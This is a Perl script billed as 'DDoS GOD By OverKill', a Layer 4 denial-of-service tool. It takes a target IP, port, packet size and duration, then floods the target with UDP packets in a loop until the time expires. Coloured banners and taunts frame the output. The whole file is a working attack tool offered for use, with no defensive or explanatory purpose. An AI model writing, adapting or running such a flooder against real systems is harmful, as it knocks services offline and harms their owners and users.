#!/usr/bin/perl
use strict;
use warnings;
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print BOLD RED "USAGE: ";
print BOLD CYAN "perl god.pl ";
print BOLD MAGENTA "[IP] ";
print BOLD YELLOW "[Port] ";
print BOLD GREEN "[Packets] ";
print BOLD BLUE "[Seconds]\n \n";
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print BOLD GREEN<<EOTEXT;
░██████╗░░█████╗░██████╗░        IP: $ip
██╔════╝░██╔══██╗██╔══██         PORT: $port
██║░░██╗░██║░░██║██║░░██║        PACKETS: $size
██║░░╚██╗██║░░██║██║░░██║        TIME: $time
╚██████╔╝╚█████╔╝██████╔╝        ADMIN: OverKill
░╚═════╝░░╚════╝░╚═════╝░                      
EOTEXT
print BOLD YELLOW<<EOTEXT;
DDoS GOD By OverKill, Attacking $ip with $size packets.
OverKill Layer4 DDoS script.  
EOTEXT
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print BOLD RED "Kill $ip " . "port ". ($port ? $port : "random") . " with " .
  ($size ? "$size byte" : "Get Null Routed Bitch!?") . "
~ Attacking: $ip
~ Time: ".($time ?"$time seconds" : "") . "\n";

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
 $iaddr));}
